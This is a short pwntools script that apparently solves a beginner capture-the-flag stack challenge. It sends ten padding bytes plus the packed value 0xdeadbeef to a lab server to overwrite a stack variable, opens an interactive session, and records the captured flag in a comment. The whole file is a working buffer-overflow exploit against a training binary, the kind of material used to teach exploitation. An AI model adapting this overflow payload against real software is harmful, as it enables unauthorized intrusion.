from pwn import *

local = False
elf = 'easy_stack_variable'

if local:
    context.binary = './' + elf
    r = process("./" + elf )
else:
    ip = "sqlab.zongyuan.nctu.me"
    port = 6001
    r = remote(ip, port)

context.arch = 'amd64'


offset = 10
variable = p64(0xdeadbeef)
payload = 'A'*offset + variable

r.recvuntil(":")
r.sendline(payload)

r.interactive()

#balqs{D0_you_kn0w_st4ck?}
